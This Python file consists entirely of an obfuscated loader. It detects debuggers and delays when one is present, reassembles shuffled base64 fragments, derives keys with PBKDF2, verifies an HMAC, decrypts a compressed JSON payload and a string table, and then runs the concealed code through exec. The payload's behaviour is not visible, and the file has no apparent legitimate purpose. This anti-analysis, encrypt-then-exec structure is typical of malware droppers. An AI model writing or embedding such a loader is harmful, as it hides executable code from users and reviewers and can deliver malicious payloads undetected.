import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_7a1a0a_0 = 'nqpZPrZSFobyKHHfh8K1B+qJXBMiNkzvI0Bp8e8QrN'
_7a1a0a_1 = 'mjjRXNU4RsfQr6kyxyCLf1dyzQuoQoGRrKdyzWY'
_7a1a0a_2 = 'DSYqwVDOnsqEvZExs2bwIe'
_7a1a0a_3 = '/PK0oY7Ggj/1pUE5Vu6ceeXrzbpVJtq9196AX5kpUaACdzXLt5VUcUJHRN'
_7a1a0a_4 = 'NfdLmUO7nB2vwLq/iyqr5EBopnUQbhiWHDCJ4F+JdZKgIpf8yFx46AZ2j5SUTY'
_7a1a0a_5 = 'Z7ZIGp2sYmwqAg/Gf/EWnid/fqwe5xaNfzqdoTargqd+29Ob'
_7a1a0a_6 = 'z4pnytlx75QnvjXOVEP57WmKGPUAJ'
_7a1a0a_7 = 'gvWCcfyzE89XNbP7XP8FBAw0sw1jvje03L4gRnh6u'
_7a1a0a_8 = 'PnZPCVnt5Gwh5qYO2aORtXpvAK6HscVUpmH5ahP7gfzE'
_7a1a0a_9 = 'Kc/pThLg4sibD9/rSweagn7ahZs6tNOM'
_7a1a0a_10 = '22C6yUBNr0XyQ6lBpFvk1roenRqb7pqHaGclTQhweU1rijh0Zew'
_7a1a0a_11 = '/SFStv+tGW47qo9wOeZAzbAo00TMJwmVrRAMZ3Ju21XrXoI'
_7a1a0a_12 = 'Si/aK0KvEMCPIUqNK1CSB9'
_7a1a0a_13 = 'zj3N1zH/4MCgQN5IWie8LH3MdidLw7RV'
_7a1a0a_14 = 'vg1QwObWDQVKdHtE160rCW6TT1YEjpqPZS5ZX6lXeVnfZmW6edhr+vsSw8i7'
_7a1a0a_15 = 'E4SeHxddRaJPYjL3GyOtgKTwTN+sHpcPV50MnpgzPyL0KUzgcj'
_7a1a0a_16 = 'bpmcyhAlDLM/eN9muLJM7XdVtT2tBGuyEiiHHWi'
_7a1a0a_17 = 'jk6zn8ymDPPiZwWzRpjTKTd'
_7a1a0a_18 = 'BxLFEcumLcmiAkDPskDSvgPwSJ1dzRNARqkB+uX30xDh'
_7a1a0a_19 = '+y9T97Roj2q86H0Sxyc/8Kw6zDd8kJCEemyZJFLHIPTlp2OJ4ztgNOoLhjo'
_7a1a0a_20 = 'ZrASRJdEbC0IPXlAtUJW/VtZjIgKDB8bhh82iLZLTQgGOqufi1fehB1nz4z5AB7'
_7a1a0a_21 = 'xXxoclK1zi9Y9aMv9/f4GlwZBLnxSU0QPEugPLERx4tgfToI3ru+aZ0b'
_7a1a0a_22 = 'NP4QnineF5QH7iQBY5BGE6QUGO6xn28E1eaZ0BG01Q4vKw='
_7a1a0a_23 = 'Y9qp2GelJW6CUsBMWPdLc0HSC2bUUddtVq6kbjSyqaoJlVIbx7EguoZFVrc'
_7a1a0a_24 = 'vbfmGvTJiYgNpeeZs+jghG'
_7a1a0a_25 = 's/3n/JeWvCXW0OBpVtih+h1AKJQefuRthOBBKhCjSowtM2IrNmEwZDq1WIuea'
_7a1a0a_26 = '9vZrgm2YHd8P2to3klurVyXIUpqXcLF'
_7a1a0a_27 = 'wIsDq9JnecQ+AvoDqC9aXCEjE6KO5DMcHO8iuQPwZ/mujf39l0jquI5'
_7a1a0a_28 = 'rAhDdbjl1oLp9i+lqZwTfA3X/75s'
_7a1a0a_29 = 'Nv4Aa1C8XWU/kzWbFJAsuZiWnFXLxsB'
_7a1a0a_30 = 'q4yIksyS4yw7aFtr13Ap5auUGXLLDCeroNsDNjVL6cpIbDu3Rr1Zl2G'
_7a1a0a_31 = 'Ff7PgclVtySGagx4VP9jsuT7jSEpRs8y6dm1G'
_7a1a0a_32 = 'h2O68/YLZL72CJvXijPECULMri0z7USPF5nSKkgqBvKhVLEvNV9UquFA'
_7a1a0a_33 = 'ha+tmaJtm8W18RGjWYp8kTMymE4PCDRPw4'
_7a1a0a_34 = 'N4EZFL0LPlVbdu6m69MaCe/LRHPzBPviw9MZqRF2NTz6BaBhiPrKM'
_pls = [_7a1a0a_0, _7a1a0a_1, _7a1a0a_2, _7a1a0a_3, _7a1a0a_4, _7a1a0a_5, _7a1a0a_6, _7a1a0a_7, _7a1a0a_8, _7a1a0a_9, _7a1a0a_10, _7a1a0a_11, _7a1a0a_12, _7a1a0a_13, _7a1a0a_14, _7a1a0a_15, _7a1a0a_16, _7a1a0a_17, _7a1a0a_18, _7a1a0a_19, _7a1a0a_20, _7a1a0a_21, _7a1a0a_22, _7a1a0a_23, _7a1a0a_24, _7a1a0a_25, _7a1a0a_26, _7a1a0a_27, _7a1a0a_28, _7a1a0a_29, _7a1a0a_30, _7a1a0a_31, _7a1a0a_32, _7a1a0a_33, _7a1a0a_34]
_d11665 = [(43396,35237,2),(10381,54703,2),(32178,28451,2),(40336,34855,2),(40190,14963,2),(4860,5335,2),(37450,29653,2),(56441,188,2),(60246,44070,2),(18887,13708,2),(13817,48117,2),(25798,33795,2),(4735,26516,2),(43657,18539,2),(44898,3131,2),(12755,2115,2),(0,0,0),(0,0,0)]
_806d32 = 'ICH9Ig=='
_d89239 = 'H6Ved9+piKeVzE2X'
_e7be3a = 'fqri5We/CB0='
_f29836 = [15, 2, 18, 4, 12, 11, 5, 8, 0, 9, 21, 13, 26, 17, 30, 3, 14, 20, 25, 10, 28, 29, 34, 31, 23, 24, 19, 16, 22, 27, 1, 32, 33, 6, 7]
_salt = base64.b64decode(_e7be3a)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _f29836
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_15cd35 = base64.b64decode(_assembled)
_a5af53 = 32
_a1c054 = _15cd35[:-_a5af53]
_a5af53 = _15cd35[-_a5af53:]
_6e6d0f = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_d11665)
_hdr = base64.b64decode(_806d32)
_nonce = base64.b64decode(_d89239)
_km_seed = hashlib.sha256(_6e6d0f + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _a1c054, hashlib.sha256).digest()
if _calc_tag != _a5af53:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_a1c054)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_a1c054, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_068aa3'] = mmap
globals()['_415a90'] = lambda i: globals()['_068aa3'][str(i)]
_x = globals()['_415a90']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
